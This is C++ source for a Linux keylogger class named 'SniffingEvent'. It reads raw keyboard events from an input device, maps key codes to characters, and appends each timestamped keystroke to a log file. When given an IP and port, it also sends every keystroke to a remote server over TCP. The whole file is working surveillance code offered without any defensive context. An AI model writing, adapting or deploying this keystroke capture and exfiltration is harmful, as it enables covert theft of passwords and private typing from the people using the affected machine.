#include <iostream>
#include <unistd.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <syslog.h>
#include <fcntl.h>
#include <vector>
#include <algorithm>
#include <fstream>
#include <chrono>
#include "define.h"
#include "TCPClient.h"

using namespace std::chrono;

struct KeyToButton
{
	int key;
	string keyToButton;
} key_to_button;

class SniffingEvent 
{
	public:
	ofstream outfile;
	TCPClient tcp;
	vector<KeyToButton> keys;

	string state_btn[3] = {
		"RELEASED",
		"PRESSED ",
		"REPEATED"
	};

	struct input_event ev;
	char *device;
	ssize_t n;
	int fd;
	bool net;

	int init(char * dev, string _ip="", int _port=0)
	{
		string path_log = LOG;
		path_log+="key_history.log";
		outfile.open(path_log, std::ios_base::app);
		if(_ip != "" && _port > 0)
		{
			net = tcp.setup(_ip,_port);
		}

		/* number */
		key_to_button.key = KEY_1;
		key_to_button.keyToButton="1";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_2;
		key_to_button.keyToButton="2";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_3;
		key_to_button.keyToButton="3";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_4;
		key_to_button.keyToButton="4";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_5;
		key_to_button.keyToButton="5";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_6;
		key_to_button.keyToButton="6";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_7;
		key_to_button.keyToButton="7";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_8;
		key_to_button.keyToButton="8";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_9;
		key_to_button.keyToButton="9";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_0;
		key_to_button.keyToButton="0";
		keys.push_back(key_to_button);

		/* letter */
		key_to_button.key = KEY_A;
		key_to_button.keyToButton="a";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_B;
		key_to_button.keyToButton="b";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_C;
		key_to_button.keyToButton="c";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_D;
		key_to_button.keyToButton="d";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_E;
		key_to_button.keyToButton="e";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_F;
		key_to_button.keyToButton="f";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_G;
		key_to_button.keyToButton="g";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_H;
		key_to_button.keyToButton="h";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_I;
		key_to_button.keyToButton="i";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_L;
		key_to_button.keyToButton="l";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_M;
		key_to_button.keyToButton="m";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_N;
		key_to_button.keyToButton="n";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_O;
		key_to_button.keyToButton="o";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_P;
		key_to_button.keyToButton="p";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_Q;
		key_to_button.keyToButton="q";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_R;
		key_to_button.keyToButton="r";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_S;
		key_to_button.keyToButton="s";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_T;
		key_to_button.keyToButton="t";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_U;
		key_to_button.keyToButton="u";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_V;
		key_to_button.keyToButton="v";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_Z;
		key_to_button.keyToButton="z";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_W;
		key_to_button.keyToButton="w";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_Y;
		key_to_button.keyToButton="y";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_J;
		key_to_button.keyToButton="j";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_K;
		key_to_button.keyToButton="k";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_X;
		key_to_button.keyToButton="x";
		keys.push_back(key_to_button);

		/* special key */
		key_to_button.key = KEY_ESC;
		key_to_button.keyToButton="ESC";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_BACKSPACE;
		key_to_button.keyToButton="BACKSPACE";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_TAB;
		key_to_button.keyToButton="TAB";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_ENTER;
		key_to_button.keyToButton="ENTER";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_LEFTCTRL;
		key_to_button.keyToButton="LEFTCTRL";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_LEFTSHIFT; 
		key_to_button.keyToButton="LEFTSHIFT";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_BACKSLASH; 
		key_to_button.keyToButton="BACKSLASH";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_DOT;
		key_to_button.keyToButton="DOT";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_SLASH;
		key_to_button.keyToButton="SLASH";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_SPACE;
		key_to_button.keyToButton="SPACE";
		keys.push_back(key_to_button);
		key_to_button.key = KEY_CAPSLOCK; 
		key_to_button.keyToButton="CAPSLOCK";
		keys.push_back(key_to_button);

		// view define.h for other key implement...
		outfile << "******************** START ********************"<<endl;

		device = dev;
		fd = open(dev, O_RDONLY);
		if (fd == -1) {
			return -1;
    		}
		return 1;
	}

	void run()
	{
		while(true) 
		{
			n = read(fd, &ev, sizeof ev);
			if (n == (ssize_t)-1) {
		            if (errno == EINTR)
                		continue;
		            else
                		break;
		        } else
		        if (n != sizeof ev) {
		            errno = EIO;
		            break;
		        }
		        if (ev.type == EV_KEY) {	
				string letter;
				for(unsigned int i = 0; i < keys.size(); i++) {
					if (keys[i].key == (int)ev.code)
						letter = keys[i].keyToButton;
				}
				char buffer[512];
		        	sprintf(buffer,"(%s) (0x%04x) (%d) (%s)", state_btn[ev.value].c_str(), (int)ev.code, (int)ev.code, letter.c_str());
				milliseconds ms = duration_cast< milliseconds >( system_clock::now().time_since_epoch() );
				time_t t = ms.count();
				string msg ="["+to_string(t)+"] "+ buffer +"\n";
				cout << msg;
				outfile << msg;
				if(net) {
			                tcp.Send(msg);
        	        	        string rec = tcp.receive();
                	        	if( rec != "" )
                        		{
                                		cout << "Server Response:" << rec << endl;
                        		}
				}
			}
		}
		usleep(9000);
	}

	void close()
	{
		fflush(stdout);
		outfile << "******************** STOP ********************"<<endl;
		outfile.close();
		exit(0);
	}
};
